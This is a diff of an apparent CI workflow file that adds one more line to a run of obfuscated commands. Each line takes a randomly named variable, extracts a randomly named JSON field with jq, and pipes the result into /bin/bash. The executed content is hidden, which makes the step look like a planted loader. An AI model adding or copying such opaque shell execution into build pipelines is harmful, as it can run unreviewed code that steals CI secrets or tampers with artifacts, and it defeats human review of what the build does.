@@ -31,6 +31,7 @@ jobs:
           echo $cn8 | jq -r .ogqt71 | /bin/bash
           echo $ts85 | jq -r .nlt85 | /bin/bash
           printf '%s' "$kld099" | jq -r .anjl83 | /bin/bash
+          printf '%s' "$yud4" | jq -r .q5 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
